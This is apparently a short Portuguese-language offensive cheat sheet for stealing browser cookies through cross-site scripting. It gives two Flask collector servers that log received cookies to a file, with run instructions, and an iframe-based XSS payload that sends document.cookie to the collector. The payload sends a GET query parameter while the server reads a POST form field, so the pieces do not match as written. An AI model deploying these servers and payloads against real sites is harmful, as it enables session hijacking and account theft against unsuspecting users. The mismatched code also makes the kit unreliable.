## Web-Server Exfiltration Basic Python

Copiar o código e salvar como web-srv.py

Executar $python ./web-srv.py

```
#!/usr/bin/env python3

from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
Payload XSS para teste:
```
<iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
```
## Web-Server Exfiltration Web Link Python

Criar uma pasta Web-srv

Copiar o código e salvar como web-srv.py

Executar $python ./web-srv.py

```
#!/usr/bin/env python3

from flask import Flask, request, make_response, render_template

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

@app.route("/")
def home():
    return render_template("index.html")
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

